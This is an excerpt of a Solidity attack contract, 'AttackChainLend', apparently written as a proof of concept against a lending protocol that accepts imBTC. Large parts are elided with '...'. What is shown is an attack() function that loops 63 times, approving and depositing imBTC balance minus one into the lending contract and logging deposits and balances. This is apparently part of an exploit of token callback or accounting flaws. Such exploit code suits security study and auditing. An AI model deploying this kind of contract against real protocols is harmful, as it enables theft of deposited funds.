...
contract AttackChainLend {
    ...
    function attack() external {
        ...
        for (uint8 i = 1; i <= 63; i++) {
            ...
            imbtc.approve(address(chainlend), currentimBTCBalance);
            chainlend.deposit(currentimBTCBalance - 1);

            console.log("currentimBTCBalance - 1", currentimBTCBalance - 1);
            ...
            console.log(
                "Currently Deposited: ",
                chainlend.deposits(address(this))
            );
            console.log(
                "Currently imBTC balance: ",
                imbtc.balanceOf(address(this))
            );
        }
        ...
        console.log("currentimBTCBalance", currentimBTCBalance);
    }
